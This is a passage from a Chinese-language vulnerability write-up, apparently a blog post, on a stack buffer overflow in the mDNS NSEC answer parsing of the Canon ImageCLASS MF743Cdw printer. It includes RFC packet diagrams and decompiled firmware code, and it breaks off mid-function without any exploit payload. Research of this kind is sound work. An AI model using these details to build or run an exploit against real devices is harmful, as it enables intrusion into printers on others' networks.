    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;主要可以拆分為 Header 及 body 部分，主要的請求都放在 body 中，後面三個欄位為同樣的格式。 Answer 欄位主要紀錄針對 Question 的 Resource records (RRs)，&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource record format:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;RDATA 部分會根據 type 不同而有所不同，而當 type=NSEC 其格式如下&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   The RDATA of the NSEC RR is as shown below:

                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                      Next Domain Name                         /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                       Type Bit Maps                           /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://www.ietf.org/rfc/rfc4034.txt)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其餘部分在這個漏洞中不太重要，不另外多做詳細解釋，更多細節可以參考 &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc6762/&quot;&gt;RFC6762&lt;/a&gt; 、 &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc1035/&quot;&gt;RFC1035&lt;/a&gt;
以及 &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc4034/&quot;&gt;RFC4034&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;漏洞位置&lt;/strong&gt;
當 Canon ImageCLASS MF743Cdw 在處理 Answer 欄位(type=NSEC)時，並沒有檢查長度導致 stack overflow 。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bnMdnsParseAnswers&lt;/code&gt; function 是主要負責處理封包中 answer 欄位&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bnMdnsParseAnswers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ------ fixed size on the stack&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_payloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_mdns_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aBnmdnsparseans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// NSEC&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;zeromemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;bnMdnsFreeRRLIST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2720&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_76:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;debugprintff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3610&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;[bnjr] [%s] &amp;lt;%s:%d&amp;gt; bnMdnsParseAnswers error in malloc(NSEC)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;s&quot;&gt;&quot;IMP/mdns/common/tcBnMdnsMsg.c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;v50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;maybe_realloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bnMdnsGetDecodedRRNameLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bnMdnsMalloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nsec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;consume_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dwbyte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v55&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v56&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;nsec_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v53&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v54&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
